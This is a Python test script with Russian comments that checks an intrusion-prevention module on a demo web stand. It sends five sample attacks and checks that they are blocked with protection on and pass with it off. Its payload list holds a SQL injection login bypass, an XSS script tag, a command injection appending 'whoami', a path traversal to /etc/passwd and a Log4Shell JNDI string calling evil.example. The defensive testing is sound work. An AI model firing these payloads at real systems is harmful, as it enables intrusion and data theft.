"""
Автоматическая проверка демостенда на уязвимости (SQLi, XSS, RCE, LFI, сигнатуры).

Режимы:
  python attack_test.py                 — самодостаточный тест: поднимает приложение
                                          через Flask test client, прогоняет атаки с
                                          ВКЛЮЧЁННОЙ и ВЫКЛЮЧЕННОЙ защитой и выдаёт вердикт.
  python attack_test.py --url URL       — бьёт по уже запущенному серверу (один проход),
                                          напр. --url http://127.0.0.1:5057

Логика: IPS блокирует атаку ответом HTTP 400. Поэтому:
  защита ВКЛ  -> атаки должны быть ЗАБЛОКИРОВАНЫ (400), обычные запросы — пройти.
  защита ВЫКЛ -> атаки ПРОХОДЯТ (доходят до уязвимого обработчика).
"""

import sys
import os
import argparse

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

# (название, метод, путь, form-data, query-params)
ATTACKS = [
    ("SQLi",                "POST", "/api/login",    {"login": "admin' OR '1'='1' --", "password": "x"}, None),
    ("XSS",                 "GET",  "/api/search",   None, {"q": "<script>alert(1)</script>"}),
    ("RCE",                 "GET",  "/api/exec",     None, {"host": "127.0.0.1; whoami"}),
    ("LFI / Path Traversal","GET",  "/api/readfile", None, {"path": "../../../../etc/passwd"}),
    ("Signature(Log4Shell)","GET",  "/api/search",   None, {"q": "${jndi:ldap://evil.example/x}"}),
]
BENIGN = ("Обычный запрос", "GET", "/api/search", None, {"q": "hello world"})

GREEN, RED, YELLOW, DIM, RESET = "\033[92m", "\033[91m", "\033[93m", "\033[2m", "\033[0m"


def _send_testclient(client, method, path, data, params):
    if method == "POST":
        resp = client.post(path, data=data or {})
    else:
        resp = client.get(path, query_string=params or {})
    return resp.status_code


def _send_http(base, method, path, data, params):
    import urllib.request
    import urllib.parse
    url = base.rstrip("/") + path
    try:
        if method == "POST":
            body = urllib.parse.urlencode(data or {}).encode()
            req = urllib.request.Request(url, data=body)
        else:
            url = url + "?" + urllib.parse.urlencode(params or {})
            req = urllib.request.Request(url)
        with urllib.request.urlopen(req, timeout=10) as r:
            return r.getcode()
    except urllib.error.HTTPError as e:
        return e.code
    except Exception:
        return 0


def _run_suite(sender):
    rows = []
    for name, method, path, data, params in ATTACKS:
        status = sender(method, path, data, params)
        rows.append((name, status, status == 400))
    return rows


def _print_table(title, rows, expect_blocked):
    print(f"\n{title}")
    print(f"  {'Уязвимость':<24}{'HTTP':<6}{'Результат':<16}{'Ожидание'}")
    print(f"  {'-'*24}{'-'*6}{'-'*16}{'-'*12}")
    ok_all = True
    for name, status, blocked in rows:
        result = "ЗАБЛОКИРОВАНО" if blocked else "ПРОПУЩЕНО"
        color = GREEN if blocked else RED
        meets = (blocked == expect_blocked)
        ok_all = ok_all and meets
        mark = f"{GREEN}✓{RESET}" if meets else f"{RED}✗{RESET}"
        exp = "блок" if expect_blocked else "проход"
        print(f"  {name:<24}{status:<6}{color}{result:<16}{RESET}{exp}  {mark}")
    return ok_all


def run_selftest():
    import logging

    from main import build_app
    from AEngineApps.security import get_security

    app = build_app()
    # Тише в консоли — нам важна итоговая таблица, а не поток лог-строк.
    logging.disable(logging.CRITICAL)
    client = app.flask.test_client()
    sec = get_security()
    if sec is None:
        print(f"{RED}Менеджер безопасности не инициализирован.{RESET}")
        return 1

    sender = lambda m, p, d, q: _send_testclient(client, m, p, d, q)

    print(f"{DIM}Демостенд поднят через Flask test client. Прогоняем атаки…{RESET}")

    # 1) Защита включена -> атаки должны блокироваться.
    sec.set_enabled("intrusion", True)
    on_rows = _run_suite(sender)
    on_ok = _print_table("🛡️  Защита ВКЛЮЧЕНА (intrusion=on):", on_rows, expect_blocked=True)

    # Обычный запрос не должен блокироваться даже при включённой защите.
    benign_status = sender(BENIGN[1], BENIGN[2], BENIGN[3], BENIGN[4])
    benign_ok = benign_status != 400
    print(f"  {BENIGN[0]:<24}{benign_status:<6}"
          f"{(GREEN+'ПРОПУЩЕНО') if benign_ok else (RED+'ЗАБЛОКИРОВАНО')}{RESET:<6}  проход  "
          f"{(GREEN+'✓') if benign_ok else (RED+'✗')}{RESET}")

    # 2) Защита выключена -> атаки проходят.
    sec.set_enabled("intrusion", False)
    off_rows = _run_suite(sender)
    off_ok = _print_table("⚠️  Защита ВЫКЛЮЧЕНА (intrusion=off):", off_rows, expect_blocked=False)

    # Возвращаем состояние.
    sec.set_enabled("intrusion", True)

    passed = on_ok and benign_ok and off_ok
    print("\n" + ("=" * 56))
    if passed:
        print(f"{GREEN}ИТОГ: защита работает корректно — атаки блокируются при ВКЛ "
              f"и проходят при ВЫКЛ.{RESET}")
        return 0
    print(f"{RED}ИТОГ: поведение защиты не совпало с ожидаемым (см. отметки ✗ выше).{RESET}")
    return 1


def run_live(base):
    sender = lambda m, p, d, q: _send_http(base, m, p, d, q)
    print(f"{DIM}Проверяем запущенный сервер: {base}{RESET}")
    rows = _run_suite(sender)
    print(f"\n  {'Уязвимость':<24}{'HTTP':<6}{'Результат'}")
    print(f"  {'-'*24}{'-'*6}{'-'*16}")
    for name, status, blocked in rows:
        color = GREEN if blocked else RED
        result = "ЗАБЛОКИРОВАНО" if blocked else "ПРОПУЩЕНО"
        if status == 0:
            color, result = YELLOW, "НЕТ ОТВЕТА"
        print(f"  {name:<24}{status:<6}{color}{result}{RESET}")
    print(f"\n{DIM}Переключайте модули на /sec-admin (вкладка «Модули») и запускайте снова.{RESET}")
    return 0


def main():
    parser = argparse.ArgumentParser(description="Проверка демостенда AEngine на уязвимости")
    parser.add_argument("--url", help="URL запущенного сервера (напр. http://127.0.0.1:5057)")
    args = parser.parse_args()

    if os.name == "nt":
        os.system("")  # включить ANSI-цвета в Windows-консоли
    try:
        sys.stdout.reconfigure(encoding="utf-8")  # эмодзи/✓ в cp1251-консоли
    except Exception:
        pass

    if args.url:
        return run_live(args.url)
    return run_selftest()


if __name__ == "__main__":
    sys.exit(main())
